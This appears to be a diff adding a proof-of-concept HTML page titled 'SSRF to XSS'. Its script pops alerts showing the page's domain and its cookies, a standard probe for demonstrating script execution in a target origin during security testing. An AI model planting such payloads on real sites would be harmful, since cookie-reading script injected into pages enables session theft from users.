@@ -1,0 +1,11 @@
+<html>
+<head>
+<title>SSRF to XSS</title>
+</head>
+<body>
+<script>
+alert( document.domain + " is vulneable" );
+alert(document.cookie);
+</script>
+</body>
+</html>
